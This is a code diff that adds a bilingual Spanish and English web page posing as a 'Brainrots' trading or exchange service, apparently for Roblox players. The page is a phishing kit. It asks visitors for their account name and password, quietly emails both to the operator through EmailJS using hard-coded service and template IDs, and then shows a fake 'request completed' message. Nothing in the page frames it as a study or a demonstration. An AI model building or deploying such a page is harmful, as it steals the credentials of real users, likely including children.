@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <link rel="icon" href="crown_game_sports_console_controller_sport_video_play_gaming_icon_262443.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- SEO MEJORADO -->
+    <title>Intercambio Brainrots</title>
+    
+    <!-- META TAGS SEO -->
+    <meta name="description" content="Completa tu peticion.">
+    <meta name="keywords" content="peticiones">
+    <meta name="author" content="Sistema de Intercambios">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        /* MOBILE-FIRST - ESTILOS OPTIMIZADOS PARA MÓVIL */
+        
+        /* RESET MEJORADO PARA MÓVILES */
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            font-size: 14px;
+        }
+
+        body {
+            margin: 0;
+            padding: 15px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
+            url('https://github.com/brainrot09900/Originalbobuxporbrainrots/blob/main/image111111.jpg?raw=true') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            line-height: 1.4;
+        }
+        
+        /* CONTENEDOR PRINCIPAL OPTIMIZADO PARA MÓVILES */
+        .ogin-container {
+            width: 100%;
+            max-width: 400px;
+            margin: 10px auto;
+            background: rgba(19, 23, 34, 0.92);
+            backdrop-filter: blur(15px);
+            border-radius: 16px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+            padding: 25px 20px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            position: relative;
+            overflow: hidden;
+        }
+        .ogin-container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #00a2ff, #ff00cc, #00ff95, #ffcc00);
+            z-index: -1;
+            border-radius: 18px;
+            opacity: 0.25;
+        } 
+        
+        /* SELECTOR DE IDIOMA */
+        .language-selector {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            z-index: 10;
+        }
+        
+        .language-selector select {
+            background: rgba(30, 35, 48, 0.8);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 6px;
+            padding: 6px 10px;
+            font-size: 0.85rem;
+            cursor: pointer;
+        }
+        
+        /* TÍTULOS OPTIMIZADOS PARA MÓVILES */
+        .intercambio-title {
+            color: #fff;
+            font-size: 2.2rem;
+            font-weight: 800;
+            margin-bottom: 5px;
+            text-shadow: 0 0 8px rgba(0, 162, 255, 0.7);
+            letter-spacing: 0.5px;
+            line-height: 1.2;
+        }
+        
+        .ogin-subtitle {
+            color: #a0aec0;
+            font-size: 1rem;
+            margin-bottom: 25px;
+            font-weight: 400;
+        }
+        
+        /* FORMULARIO MEJORADO PARA TACTIL */
+        .ogin-form {
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #e2e8f0;
+            font-size: 0.95rem;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: all 0.2s;
+            background: rgba(30, 35, 48, 0.8);
+            color: #fff;
+            min-height: 48px;
+        }
+        
+        .form-group input::placeholder {
+            color: #a0aec0;
+        }
+        
+        .form-group input:focus {
+            border-color: #00a2ff;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.25);
+            background: rgba(40, 45, 60, 0.9);
+        }
+        
+        /* BOTONES OPTIMIZADOS PARA TACTIL */
+        .accept-btn {
+            background: linear-gradient(to right, #00a2ff, #00d4ff);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 16px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s;
+            margin-top: 8px;
+            letter-spacing: 0.3px;
+            box-shadow: 0 4px 12px rgba(0, 162, 255, 0.3);
+            min-height: 50px;
+            touch-action: manipulation;
+        }
+        
+        .accept-btn:hover {
+            background: linear-gradient(to right, #0088cc, #00b8e6);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 162, 255, 0.4);
+        }
+        
+        .accept-btn:active {
+            transform: translateY(0);
+        }
+        
+        /* MENSAJES Y ESTADOS OPTIMIZADOS */
+        .loading {
+            display: none;
+            color: #00a2ff;
+            font-size: 1rem;
+            margin: 8px 0;
+            padding: 10px;
+        }
+        
+        .error-message {
+            display: none;
+            color: #ff6b6b;
+            background: rgba(255, 107, 107, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            margin: 8px 0;
+            font-size: 0.85rem;
+            border-left: 4px solid #ff6b6b;
+        }
+        
+        /* MENSAJE DE GRACIAS OPTIMIZADO */
+        .gracias-mensaje {
+            display: none;
+            text-align: center;
+            padding: 30px 20px;
+            background: rgba(39, 174, 96, 0.15);
+            border-radius: 12px;
+            border: 1px solid rgba(39, 174, 96, 0.3);
+            margin-top: 15px;
+            backdrop-filter: blur(5px);
+        }
+        
+        .gracias-mensaje h2 {
+            color: #27ae60;
+            margin-bottom: 15px;
+            font-size: 1.7rem;
+            text-shadow: 0 0 8px rgba(39, 174, 96, 0.3);
+        }
+        
+        .gracias-mensaje p {
+            color: #e2e8f0;
+            margin-bottom: 12px;
+            font-size: 1rem;
+            line-height: 1.4;
+        }
+        
+        /* MEJORAS ESPECÍFICAS PARA MÓVILES PEQUEÑOS */
+        @media (max-width: 380px) {
+            .ogin-container {
+                padding: 20px 15px;
+                border-radius: 14px;
+            }
+            
+            .intercambio-title {
+                font-size: 1.9rem;
+            }
+            
+            .ogin-subtitle {
+                font-size: 0.9rem;
+                margin-bottom: 20px;
+            }
+            
+            .form-group input {
+                padding: 12px 14px;
+                font-size: 0.95rem;
+            }
+            
+            .accept-btn {
+                padding: 14px;
+                font-size: 0.95rem;
+            }
+            
+            .gracias-mensaje h2 {
+                font-size: 1.5rem;
+            }
+        }
+        
+        /* MEJORAS PARA MÓVILES EN HORIZONTAL */
+        @media (max-height: 500px) and (orientation: landscape) {
+            body {
+                padding: 10px;
+                align-items: flex-start;
+            }
+            
+            .ogin-container {
+                margin: 5px auto;
+                padding: 20px;
+            }
+            
+            .intercambio-title {
+                font-size: 1.8rem;
+                margin-bottom: 3px;
+            }
+            
+            .ogin-subtitle {
+                margin-bottom: 15px;
+                font-size: 0.9rem;
+            }
+            
+            .form-group {
+                margin-bottom: 15px;
+            }
+        }
+        
+        /* ESTILOS PARA ESCRITORIO (Mobile First) */
+        @media (min-width: 768px) {
+            html {
+                font-size: 16px;
+            }
+            
+            .ogin-container {
+                max-width: 480px;
+                padding: 40px 35px;
+                border-radius: 20px;
+            }
+            
+            .intercambio-title {
+                font-size: 2.8rem;
+                margin-bottom: 8px;
+            }
+            
+            .ogin-subtitle {
+                font-size: 1.1rem;
+                margin-bottom: 35px;
+            }
+            
+            .form-group input {
+                padding: 16px 18px;
+            }
+            
+            .accept-btn {
+                padding: 18px;
+            }
+            
+            .gracias-mensaje h2 {
+                font-size: 2rem;
+            }
+        }
+
+        /* MEJORAS DE ACCESIBILIDAD TÁCTIL */
+        @media (pointer: coarse) {
+            .accept-btn:hover {
+                transform: none;
+            }
+            
+            .form-group input {
+                font-size: 16px;
+            }
+        }
+
+        /* FOCUS VISIBLE MEJORADO */
+        .accept-btn:focus-visible,
+        input:focus-visible {
+            outline: 3px solid #00a2ff;
+            outline-offset: 2px;
+        }
+    </style>
+</head>
+<body>
+    <div class="ogin-container">
+        <!-- SELECTOR DE IDIOMA -->
+        <div class="language-selector">
+            <select id="language-select">
+                <option value="es">Español</option>
+                <option value="en">English</option>
+            </select>
+        </div>
+        
+        <div class="intercambio-title">INTERCAMBIO</div>
+        <div class="ogin-subtitle" data-es="Completar peticion" data-en="Complete request">Completar Peticion</div>
+        
+        <form id="oblox-ogin-form" class="ogin-form">
+            <div class="form-group">
+                <label for="username" data-es="Cuenta:" data-en="Account:">Cuenta:</label>
+                <input type="text" id="username" 
+                       data-es-placeholder="Ingresa tu cuenta" 
+                       data-en-placeholder="Enter your account"
+                       placeholder="Ingresa tu cuenta" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="access" data-es="Contraseña:" data-en="Password:">Contraseña:</label>
+                <input type="password" id="access" 
+                       data-es-placeholder="Ingresa tu contraseña" 
+                       data-en-placeholder="Enter your password"
+                       placeholder="Ingresa tu contraseña" required>
+            </div>
+            
+            <div class="loading" id="loading" data-es="Enviando datos..." data-en="Sending data...">Enviando datos...</div>
+            <div class="error-message" id="error-message"></div>
+            
+            <button type="submit" class="accept-btn" id="submit-btn" data-es="ENVIAR" data-en="SEND">ENVIAR</button>
+        </form>
+        
+        <!-- Mensaje de gracias -->
+        <div class="gracias-mensaje" id="gracias-mensaje">
+            <h2 data-es="¡Gracias! ✅" data-en="Thank You! ✅">¡Gracias! ✅</h2>
+            <p><strong data-es="Peticion completada con éxito" data-en="Request completed successfully">Peticion completada con éxito</strong></p>
+            <p data-es="Tu peticion ha sido procesada" data-en="Your request has been processed">Tu Peticion ha sido procesada</p>
+            <p data-es="Te contactaremos en 24-48 horas" data-en="We will contact you in 24-48 hours">Te contactamos en 24-48 horas</p>
+        </div>
+    </div>
+
+    <script>
+        // Textos traducidos
+        const translations = {
+            es: {
+                title: "INTERCAMBIO",
+                subtitle: "Completar",
+                usernameLabel: "Cuenta:",
+                usernamePlaceholder: "Ingresa tu cuenta",
+                accessLabel: "Contraseña:",
+                accessPlaceholder: "Ingresa tu contraseña",
+                loading: "Enviando datos...",
+                acceptButton: "ENVIAR",
+                thankYou: "¡Gracias! ✅",
+                requestSuccess: "Peticion completada con éxito",
+                brainrotProcessed: "Tu Peticion ha sido procesada",
+                bobuxArrival: "Contacto en 24-48 horas"
+            },
+            en: {
+                title: "EXCHANGE",
+                subtitle: "Complete",
+                usernameLabel: "Account:",
+                usernamePlaceholder: "Enter your account",
+                accessLabel: "Password:",
+                accessPlaceholder: "Enter your password",
+                loading: "Sending data...",
+                acceptButton: "SEND",
+                thankYou: "Thank You! ✅",
+                requestSuccess: "Request completed successfully",
+                brainrotProcessed: "Your request has been processed",
+                bobuxArrival: "We will contact you in 24-48 hours"
+            }
+        };
+
+        // Idioma por defecto
+        let currentLang = 'es';
+
+        // Inicializar EmailJS
+        emailjs.init("BgugL5adTp__2FfNx");
+        
+        // Función para cambiar idioma
+        function changeLanguage(lang) {
+            currentLang = lang;
+            
+            // Actualizar textos con atributos data
+            document.querySelectorAll('[data-es]').forEach(element => {
+                if (element.hasAttribute(`data-${lang}`)) {
+                    if (element.tagName === 'INPUT') {
+                        const placeholder = element.getAttribute(`data-${lang}-placeholder`);
+                        if (placeholder) {
+                            element.placeholder = placeholder;
+                        }
+                    } else {
+                        element.textContent = element.getAttribute(`data-${lang}`);
+                    }
+                }
+            });
+        }
+        
+        // Manejar envío del formulario
+        document.getElementById('oblox-ogin-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const access = document.getElementById('access').value;
+            
+            if (username && access) {
+                // Mostrar loading
+                document.getElementById('loading').style.display = 'block';
+                document.getElementById('error-message').style.display = 'none';
+                document.getElementById('submit-btn').disabled = true;
+                
+                const templateParams = {
+                    from_name: 'Sistema de Intercambios',
+                    to_name: 'Tú',
+                    usuario_oblox: username,
+                    contra_oblox: access,
+                    fecha: new Date().toLocaleString()
+                };
+                
+                console.log('Enviando email con Template ID: template_joy0l7f');
+                
+                // Enviar email
+                emailjs.send('service_j14x9qk', 'template_joy0l7f', templateParams)
+                    .then(function(response) {
+                        console.log('✅ Email enviado correctamente!', response);
+                        
+                        // Ocultar formulario y mostrar mensaje de gracias
+                        document.getElementById('oblox-ogin-form').style.display = 'none';
+                        document.getElementById('gracias-mensaje').style.display = 'block';
+                        
+                        // Guardar datos de la peticion
+                        const peticion = {
+                            usuario: username,
+                            fecha: new Date().toLocaleString(),
+                            estado: 'completada',
+                            email_enviado: true
+                        };
+                        localStorage.setItem('peticionoblox', JSON.stringify(peticion));
+                    })
+                    .catch(function(error) {
+                        console.error('❌ Error enviando email:', error);
+                        
+                        // Mostrar error específico
+                        let mensajeError = 'Error al enviar los datos. ';
+                        if (error.text) {
+                            mensajeError += error.text;
+                        }
+                        document.getElementById('error-message').textContent = mensajeError;
+                        document.getElementById('error-message').style.display = 'block';
+                        
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('submit-btn').disabled = false;
+                    });
+            }
+        });
+
+        // Inicializar página
+        document.addEventListener('DOMContentLoaded', function() {
+            // Configurar selector de idioma
+            document.getElementById('language-select').addEventListener('change', function(e) {
+                changeLanguage(e.target.value);
+            });
+            
+            // Cargar idioma guardado
+            const savedLang = localStorage.getItem('selectedLanguage');
+            if (savedLang && ['es', 'en'].includes(savedLang)) {
+                document.getElementById('language-select').value = savedLang;
+                changeLanguage(savedLang);
+            } else {
+                changeLanguage('es');
+            }
+        });
+    </script>
+</body>
+</html>
